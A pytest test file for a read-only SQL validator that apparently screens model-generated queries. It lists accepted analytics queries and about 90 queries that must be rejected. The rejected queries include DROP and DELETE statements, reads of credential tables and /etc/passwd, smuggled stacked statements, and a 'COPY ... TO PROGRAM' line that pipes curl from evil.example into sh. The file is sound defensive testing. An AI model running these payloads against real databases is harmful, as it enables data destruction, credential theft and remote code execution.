import pytest

from app.guard import validate

# Queries a model legitimately produces for this schema. Every one must be accepted.
GOOD = {
    "count": "SELECT COUNT(*) FROM customers",
    "filter_agg": "SELECT SUM(total_amount) FILTER (WHERE status IN ('completed','shipped')) AS revenue FROM orders",
    "join_group": "SELECT c.name, SUM(oi.quantity * oi.unit_price) AS rev FROM order_items oi JOIN products p ON p.id = oi.product_id JOIN categories c ON c.id = p.category_id JOIN orders o ON o.id = oi.order_id WHERE o.status IN ('completed','shipped') GROUP BY c.name ORDER BY rev DESC LIMIT 5",
    "date_trunc": "SELECT DATE_TRUNC('month', order_date)::date AS month, COUNT(*) FROM orders GROUP BY 1 ORDER BY 1",
    "extract": "SELECT EXTRACT(YEAR FROM order_date) AS y, COUNT(*) FROM orders GROUP BY y",
    "to_char": "SELECT TO_CHAR(order_date, 'YYYY-MM') AS ym, SUM(total_amount) FROM orders GROUP BY ym",
    "cte": "WITH monthly AS (SELECT DATE_TRUNC('month', order_date) AS m, SUM(total_amount) AS rev FROM orders GROUP BY 1) SELECT m, rev, LAG(rev) OVER (ORDER BY m) AS prev FROM monthly",
    "window": "SELECT full_name, ROW_NUMBER() OVER (PARTITION BY country ORDER BY signup_date) AS rn FROM customers",
    "subquery": "SELECT name FROM products WHERE price > (SELECT AVG(price) FROM products)",
    "exists": "SELECT full_name FROM customers c WHERE EXISTS (SELECT 1 FROM orders o WHERE o.customer_id = c.id AND o.status = 'refunded')",
    "case": "SELECT CASE WHEN rating >= 4 THEN 'good' WHEN rating = 3 THEN 'ok' ELSE 'bad' END AS bucket, COUNT(*) FROM reviews GROUP BY 1",
    "union": "SELECT 'customer' AS kind, COUNT(*) FROM customers UNION ALL SELECT 'order', COUNT(*) FROM orders",
    "string_agg": "SELECT channel, STRING_AGG(DISTINCT status, ', ') FROM orders GROUP BY channel",
    "percentile": "SELECT PERCENTILE_CONT(0.5) WITHIN GROUP (ORDER BY total_amount) AS median FROM orders",
    "round_avg": "SELECT carrier, ROUND(AVG(delivered_at - shipped_at), 1) FROM shipments WHERE delivered_at IS NOT NULL GROUP BY carrier",
    "ilike_coalesce": "SELECT COALESCE(city, 'n/a'), COUNT(*) FROM customers WHERE full_name ILIKE '%an%' GROUP BY 1",
    "left_join": "SELECT p.name FROM products p LEFT JOIN order_items oi ON oi.product_id = p.id WHERE oi.id IS NULL",
    "public_schema": "SELECT COUNT(*) FROM public.orders",
    "interval": "SELECT COUNT(*) FROM orders WHERE order_date >= DATE '2026-11-15' - INTERVAL '30 days'",
    "having": "SELECT customer_id FROM orders GROUP BY customer_id HAVING COUNT(*) > 5",
    "trailing_semicolon": "SELECT 1 FROM orders;",
    "parenthesised": "(SELECT id FROM orders)",
    "commented": "SELECT /* revenue */ SUM(total_amount) FROM orders -- all time",
    "distinct_on_like": "SELECT DISTINCT country FROM customers ORDER BY country",
    "greatest": "SELECT GREATEST(price, cost) FROM products",
    "age": "SELECT AGE(DATE '2026-11-15', signup_date) FROM customers",
}


@pytest.mark.parametrize("name", GOOD)
def test_legitimate_queries_are_accepted(name):
    result = validate(GOOD[name])
    assert result.ok, f"{name}: {result.message}"
    assert result.sql and "LIMIT" in result.sql.upper()


# Everything here must be rejected. Each entry is something a model could emit after a malicious or confused prompt.
ATTACKS = {
    # statement type
    "drop": "DROP TABLE orders",
    "delete": "DELETE FROM orders",
    "delete_where": "DELETE FROM customers WHERE id = 1",
    "update": "UPDATE products SET price = 0",
    "insert": "INSERT INTO customers (full_name) VALUES ('x')",
    "truncate": "TRUNCATE orders",
    "alter": "ALTER TABLE orders ADD COLUMN x int",
    "create_table": "CREATE TABLE evil AS SELECT * FROM customers",
    "create_role": "CREATE ROLE evil SUPERUSER",
    "grant": "GRANT ALL ON orders TO PUBLIC",
    "copy_to_program": "COPY orders TO PROGRAM 'curl evil.example | sh'",
    "copy_from": "COPY orders FROM '/etc/passwd'",
    "set_role": "SET ROLE postgres",
    "set_session": "SET statement_timeout = 0",
    "reset": "RESET ALL",
    "do_block": "DO $$ BEGIN DELETE FROM orders; END $$",
    "call": "CALL do_something()",
    "vacuum": "VACUUM orders",
    "explain_analyze_delete": "EXPLAIN ANALYZE DELETE FROM orders",
    "begin": "BEGIN",
    "commit": "COMMIT",
    "lock": "LOCK TABLE orders IN ACCESS EXCLUSIVE MODE",
    "show": "SHOW ALL",
    "listen": "LISTEN x",
    # stacked / smuggled
    "stacked_drop": "SELECT 1; DROP TABLE orders",
    "stacked_select": "SELECT 1; SELECT 2",
    "comment_hidden_stack": "SELECT 1 /* ; */ ; DELETE FROM orders",
    "cte_delete": "WITH d AS (DELETE FROM orders RETURNING *) SELECT * FROM d",
    "cte_update": "WITH u AS (UPDATE products SET price = 1 RETURNING *) SELECT * FROM u",
    "cte_insert": "WITH i AS (INSERT INTO customers (full_name) VALUES ('x') RETURNING *) SELECT * FROM i",
    "select_into": "SELECT * INTO backup FROM orders",
    "for_update": "SELECT * FROM orders FOR UPDATE",
    "for_share": "SELECT * FROM orders FOR SHARE",
    "empty": "",
    "whitespace": "   \n  ",
    "garbage": "this is not sql at all )(",
    "unbalanced": "SELECT * FROM orders WHERE (id = 1",
    # data the role must never reach
    "private_schema": "SELECT * FROM private.staff",
    "private_keys": "SELECT key_hash FROM private.api_keys",
    "private_quoted": 'SELECT * FROM "private"."staff"',
    "private_spaced": "SELECT * FROM private . staff",
    "private_scalar_subquery": "SELECT (SELECT password_hash FROM private.staff LIMIT 1)",
    "private_in_cte": "WITH s AS (SELECT * FROM private.staff) SELECT * FROM s",
    "private_in_where": "SELECT * FROM orders WHERE id IN (SELECT id FROM private.api_keys)",
    "meta_schema": "SELECT * FROM askbase_meta.docs",
    "information_schema": "SELECT * FROM information_schema.tables",
    "information_schema_cols": "SELECT column_name FROM information_schema.columns",
    "pg_catalog_table": "SELECT * FROM pg_catalog.pg_user",
    "pg_authid": "SELECT rolname, rolpassword FROM pg_authid",
    "pg_shadow_unqualified": "SELECT * FROM pg_shadow",
    "pg_roles": "SELECT * FROM pg_roles",
    "pg_stat_activity": "SELECT * FROM pg_stat_activity",
    "unknown_table": "SELECT * FROM users",
    "cross_database": "SELECT * FROM otherdb.public.orders",
    "quoted_case": 'SELECT * FROM "Orders"',
    "union_to_private": "SELECT id FROM orders UNION SELECT id FROM private.api_keys",
    "join_private": "SELECT * FROM orders o JOIN private.staff s ON s.id = o.id",
    "lateral_private": "SELECT * FROM orders o, LATERAL (SELECT * FROM private.staff) s",
    # functions
    "pg_sleep": "SELECT pg_sleep(60)",
    "pg_sleep_in_where": "SELECT * FROM orders WHERE pg_sleep(1) IS NOT NULL",
    "pg_read_file": "SELECT pg_read_file('/etc/passwd')",
    "pg_ls_dir": "SELECT pg_ls_dir('/')",
    "pg_catalog_qualified_fn": "SELECT pg_catalog.pg_sleep(5)",
    "pg_terminate": "SELECT pg_terminate_backend(pid) FROM pg_stat_activity",
    "pg_reload": "SELECT pg_reload_conf()",
    "lo_import": "SELECT lo_import('/etc/passwd')",
    "lo_export": "SELECT lo_export(1, '/tmp/x')",
    "dblink": "SELECT * FROM dblink('host=evil', 'select 1') AS t(x int)",
    "set_config": "SELECT set_config('statement_timeout', '0', false)",
    "current_setting": "SELECT current_setting('server_version')",
    "version": "SELECT version()",
    "current_user": "SELECT current_user",
    "session_user": "SELECT session_user",
    "current_database": "SELECT current_database()",
    "current_schema": "SELECT current_schema()",
    "nextval": "SELECT nextval('orders_id_seq')",
    "setval": "SELECT setval('orders_id_seq', 1)",
    "lastval": "SELECT lastval()",
    "txid_current": "SELECT txid_current()",
    "inet_server_addr": "SELECT inet_server_addr()",
    "query_to_xml": "SELECT query_to_xml('select * from private.staff', true, true, '')",
    "unknown_function": "SELECT my_custom_func(1)",
    "unknown_schema_function": "SELECT public.my_custom_func(1)",
    "generate_series_dos": "SELECT * FROM generate_series(1, 1000000000)",
    "generate_series_scalar": "SELECT generate_series(1, 1000000000)",
    "has_privilege": "SELECT has_table_privilege('orders', 'DELETE')",
    # types and parameters
    "regclass_cast": "SELECT 'private.staff'::regclass",
    "regproc_cast": "SELECT 'pg_sleep'::regproc",
    "bind_param": "SELECT * FROM orders WHERE id = $1",
    "placeholder": "SELECT * FROM orders WHERE id = ?",
    "named_param": "SELECT * FROM orders WHERE id = :id",
}


@pytest.mark.parametrize("name", ATTACKS)
def test_attacks_are_rejected(name):
    result = validate(ATTACKS[name])
    assert not result.ok, f"{name} was ACCEPTED as: {result.sql}"
    assert result.sql is None and result.reasons and result.codes


def test_attack_count_is_substantial():
    assert len(ATTACKS) >= 90


def test_rejection_messages_are_specific():
    assert "read-only" in validate("DELETE FROM orders").message or "SELECT" in validate("DELETE FROM orders").message
    assert "private" in validate("SELECT * FROM private.staff").message
    assert "pg_sleep" in validate("SELECT pg_sleep(1)").message
    assert "exactly one statement" in validate("SELECT 1; SELECT 2").message


def test_limit_is_forced_and_capped():
    assert validate("SELECT * FROM orders").sql.upper().endswith("LIMIT 500")
    assert validate("SELECT * FROM orders", max_rows=50).sql.upper().endswith("LIMIT 50")
    assert validate("SELECT * FROM orders LIMIT 10").sql.upper().endswith("LIMIT 10")
    assert not validate("SELECT * FROM orders LIMIT 10").limit_applied
    big = validate("SELECT * FROM orders LIMIT 100000")
    assert big.sql.upper().endswith("LIMIT 500") and big.limit_applied
    assert validate("SELECT * FROM orders LIMIT ALL").sql.upper().endswith("LIMIT 500")


def test_set_operations_are_wrapped_so_the_cap_covers_the_whole_result():
    out = validate("SELECT id FROM orders UNION ALL SELECT id FROM customers").sql
    assert out.upper().startswith("SELECT * FROM (") and out.upper().endswith("LIMIT 500")


def test_fetch_first_cannot_bypass_the_cap():
    result = validate("SELECT * FROM orders FETCH FIRST 1000000 ROWS ONLY")
    assert result.ok and result.sql.upper().endswith("LIMIT 500") and "FETCH" not in result.sql.upper()


def test_regenerated_sql_is_what_runs_and_is_stable():
    first = validate("select   COUNT(*)  from  Orders  -- note\n where status='completed'")
    assert first.ok
    again = validate(first.sql)
    assert again.ok and again.sql == first.sql and not again.limit_applied
    assert "--" not in first.sql  # comments never reach the database


def test_tables_are_reported():
    result = validate("SELECT * FROM orders o JOIN customers c ON c.id = o.customer_id")
    assert result.tables == ["customers", "orders"]


def test_cte_names_do_not_open_a_hole():
    # A CTE called like a forbidden table is fine, but the real private table is still rejected inside it.
    assert validate("WITH staff AS (SELECT id FROM orders) SELECT * FROM staff").ok
    assert not validate("WITH staff AS (SELECT * FROM private.staff) SELECT * FROM staff").ok


def test_size_limits():
    assert not validate("SELECT " + ", ".join(["1"] * 3000) + " FROM orders").ok
    assert not validate("SELECT 1 FROM orders WHERE " + " AND ".join(["id > 0"] * 2000)).ok
    assert not validate("x" * 7000).ok


def test_deep_nesting_is_rejected_not_crashing():
    assert not validate("SELECT " + "(" * 5000 + "1" + ")" * 5000).ok
